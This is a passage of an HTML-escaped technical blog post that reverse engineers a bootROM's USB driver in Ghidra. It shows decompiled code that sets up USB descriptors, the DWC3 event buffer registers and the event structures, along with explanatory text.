  &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="n"&gt;bVar1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="n"&gt;bVar2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;undefined4&lt;/span&gt; &lt;span class="n"&gt;uVar3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;uVar3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DAT_02021548&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bDescriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DT_CONFIG&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wTotalLengthL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wTotalLengthH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bNumInterfaces&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bConfigurationValue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;iConfiguration&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bmAttributes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;maxPower&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xfa&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bDescriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DT_INTERFACE&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterfaceNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bAlternateSetting&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bNumEndpoints&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterfaceClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_CLASS_VENDOR_SPEC&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterfaceSubClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterfaceProtocol&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;iInterface&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bDescriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DT_ENDPOINT&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bEndpointAddress&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x81&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DIR_IN | 1 : endpoint 1, direction IN&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bmAttributes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_ENDPOINT_XFER_BULK&lt;/span&gt;
  &lt;span class="n"&gt;bVar1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;uVar3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wMaxPacketSizeL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bVar1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;bVar2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;)((&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;uVar3&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wMaxPacketSizeH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bVar2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bDescriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DT_ENDPOINT&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bEndpointAddress&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DIR_OUT | 2 : endpoint 2, direction OUT&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bmAttributes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_ENDPOINT_XFER_BULK&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wMaxPacketSizeL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bVar1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wMaxPacketSizeH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bVar2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Among the important details in these descriptors, we can learn that this code implements :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;1 device&lt;/strong&gt; : vendor ID = 0x04E8, product ID = 0x1234.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;1 interface&lt;/strong&gt; of vendor-specific class, which means protocol is likely proprietary.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2 bulk endpoints&lt;/strong&gt; : endpoint 1 for BULK IN transfers, endpoint 2 for BULK OUT transfers.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Event buffer setup&lt;/h2&gt;
&lt;p&gt;During USB initialization, USB driver allocates a buffer called &lt;em&gt;event buffer&lt;/em&gt; and informs USB controller by writing its address and size into registers &lt;strong&gt;DWC3_GEVNTADRLO&lt;/strong&gt;, &lt;strong&gt;DWC3_GEVNTADRHI&lt;/strong&gt;, &lt;strong&gt;DWC3_GEVNTSIZ&lt;/strong&gt;. Once setup, USB controller can write events intended for USB driver into this shared buffer.&lt;/p&gt;
&lt;p&gt;In Linux kernel, these registers are accessed by a single function &lt;em&gt;dwc3_event_buffers_setup&lt;/em&gt;, called once during USB driver initialization. In bootROM code, event buffer is setup in the same way :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;usb_setup_event_buffer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt; &lt;span class="n"&gt;bufferHigh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt; &lt;span class="n"&gt;bufferLow&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;ushort&lt;/span&gt; &lt;span class="n"&gt;bufferSize&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;local_14&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;uVar1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;cWrite_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_GEVNTADRHI&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;bufferHigh&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;cWrite_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_GEVNTADRLO&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;bufferLow&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;uVar1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cRead_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_GEVNTSIZ&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;local_14&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;uVar1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xffff0000&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;bufferSize&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;cWrite_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_GEVNTSIZ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;local_14&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Events written to this buffer are 32-bit values with different structures depending on their type : either device or endpoint event. These structures, defined in the Linux kernel, can be imported into Ghidra to facilitate the reversing process.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_event_depevt&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;// Device Endpoint Events&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;one_bit&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// not used&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;endpoint_number&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// number of the endpoint&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;endpoint_event&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// event type&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;reserved11_10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;status&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// Indicates the status of the event&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;parameters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// Parameters of the current event&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;__packed&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_event_devt&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;// Device Events&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;is_devspec&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// indicates this is a non-endpoint event (device-specific)&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;device_event&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// indicates it&amp;#39;s a device event&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// type of device event&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;reserved15_12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;event_info&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// Information about this event&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;reserved31_25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;__packed&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;USB events count&lt;/h2&gt;
&lt;p&gt;Register &lt;strong&gt;DWC3_GEVNTCOUNT&lt;/strong&gt; (updated by USB controller) contains the count of events pending in event buffer. BootROM code implements a simple function (named &lt;em&gt;read_DWC3_GEVNTCOUNT&lt;/em&gt; here) to read this register :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="nf"&gt;read_DWC3_GEVNTCOUNT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;eventCnt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;eventCnt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cRead_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_GEVNTCOUNT&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;short&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;eventCnt&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Again, we located that function by looking at references to &lt;strong&gt;DWC3_GEVNTCOUNT&lt;/strong&gt; register.&lt;/p&gt;
&lt;h2&gt;USB event handler&lt;/h2&gt;
&lt;p&gt;By inspecting incoming function calls in Ghidra, we can now easily locate the main function that processes USB events :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;usb_event_handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;dwc3_event&lt;/span&gt; &lt;span class="n"&gt;evt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
